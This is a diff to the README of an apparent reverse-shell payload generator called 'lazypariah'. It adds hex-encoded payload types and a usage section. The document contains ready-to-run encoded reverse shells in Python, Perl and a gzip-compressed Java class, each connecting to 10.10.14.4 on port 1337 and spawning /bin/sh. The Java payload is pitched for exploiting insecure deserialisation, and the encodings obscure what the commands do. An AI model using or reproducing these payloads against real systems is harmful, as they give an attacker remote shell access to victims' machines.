@@ -44,13 +44,17 @@ Valid Payloads:
     c_binary_b64
     c_binary_gzip
     c_binary_gzip_b64
+    c_binary_gzip_hex
+    c_binary_hex
     java_class_b64
     java_class_binary
     java_class_gzip_b64
     nc
     nc_pipe
     perl
+    perl_b64
     perl_c
+    perl_hex
     php_fd_3
     php_fd_3_c
     php_fd_3_tags
@@ -66,13 +70,17 @@ Valid Payloads:
     python
     python2_b64
     python2_c
+    python2_hex
     python3_b64
     python3_c
+    python3_hex
     python_b64
     python_c
+    python_hex
     ruby
     ruby_b64
     ruby_c
+    ruby_hex
     socat
 
 Valid Options:
@@ -104,7 +112,12 @@ For example, the command `lazypariah python3_b64 10.10.14.4 1337` should produce
 echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python3
 ```
 
-The exception to this is compiled payloads, such as `c_binary_b64` and `java_class_gzip_b64`. Since C and Java are not interpreted languages, selecting these payloads will simply output base64-encoded data. If one selects the latter (`java_class_gzip_b64`), the resulting payload should be a base64-encoded gzip-compressed Java class file containing a reverse shell payload. Such payloads may be useful for exploiting insecure deserialisation in a Java web application. For example, the command `lazypariah java_class_gzip_b64 10.10.14.4 1337` should produce the following payload:
+In a similar manner, selecting payloads ending with `_hex` will produce a command that pipes a hexadecimal-encoded block of code through to `xxd -p -r -` and then on through to the relevant interpreter. For example, `lazypariah perl_hex 10.10.14.4 1337` should produce the following output:
+```
+echo 75736520536f636b65743b24693d2231302e31302e31342e34223b24703d313333373b736f636b657428532c50465f494e45542c534f434b5f53545245414d2c67657470726f746f62796e616d6528227463702229293b696628636f6e6e65637428532c736f636b616464725f696e2824702c696e65745f61746f6e282469292929297b6f70656e28535444494e2c223e265322293b6f70656e285354444f55542c223e265322293b6f70656e285354444552522c223e265322293b6578656328222f62696e2f7368202d6922293b7d3b | xxd -p -r - | perl
+```
+
+The exception to this is compiled payloads, such as `c_binary_b64`, `java_class_gzip_b64` and `c_binary_hex`. Since C and Java are not interpreted languages, selecting these payloads will simply output the base64-encoded or hexadecimal-encoded data (depending on the payload). If one selects the latter (`java_class_gzip_b64`), the resulting payload should be a base64-encoded gzip-compressed Java class file containing a reverse shell payload. Such payloads may be useful for exploiting insecure deserialisation in a Java web application. For example, the command `lazypariah java_class_gzip_b64 10.10.14.4 1337` should produce the following payload:
 ```
 H4sIAGBTu18AA3VTXVcSURTdgzNcoFEUMaU0M7XwC7QsE8xK08LwoyANzVoD3HQUGdfMUPZXfKi1fPG1XrCVq35AP6bVL8jOBUnJGu5sztl3n3vOmTnz/deXbwBG8MqDNvQw9DL0udDvgQMDAkICwgyDLgx54MJ1DzpxQ8CwcEvWTWGV4JYHXRgRcNuDbowKiCgoXxQaxZgIuMMwLv7viph7DPcZJiQ4x/S8bo9LqAn2LEqQJ40sl+CN63k+V9hKczOppXPE1CZsLbM5q22XfIZJhgcMUxI8UzsZvm3rRt4iJ2EUzAyf1kUIM63QhvZGU3EJ7RJahB3Oafm18IJpZLhlTRT0XJabEupPthK2qefXKDic1vNha10ET6t4iEcqYpih0kraPLfDCSOzyW1KOjQYEms4NCzUj1XEMatiTsA8FlQ8wVMVCSRVPBOwiCUVz9HOkFKxjBUVL5CU0HhSxJ+WVKyiXcVLUb/DtKoqnU9v8AylbzjTV+Us3QjH8tsFm3ri2pYEf4WdL9in6PPBlfjfDyAqXkajybO6SUmmTNMwK/K24HJP/H/PMipBsWzNpLqagv+QRUW6s9liIl3dGrer6m2unFDdSLQsrSrKS0R1Vy2ngk/vULRLtyZzhsWzpalbluAmnZ4rDxoxMZpDktK28tbUbSLlYKlC5XWuYK1XvYXk+rHSynG+LZQzQunmO7q9qOUKYg6z3LJN4x2JMiItOtBK3524JPrRcNLXdlk4cMJN7MfeA0iHcKTkr6hJ1fjkxAEUuQhnESx+CFfK525QRg/gme0r4twcgRqR+4uojShk10WcZHsjjLB+F6sDRTS8hzfAyPAV0bh/9DMgl7j6ABNWmfwRUI5Jp7AqJCvCH6DEfj+aPqOZzm9Z2ocr4to/2iPnAiW5+IlK38UH7CFAnXRA9CGVurtC2At2hGm4GFoZOpkwuiqrmxapfX7/EkNAxlXSyxQXoPsa2Q4EfwOw0NwVrQQAAA==
 ```
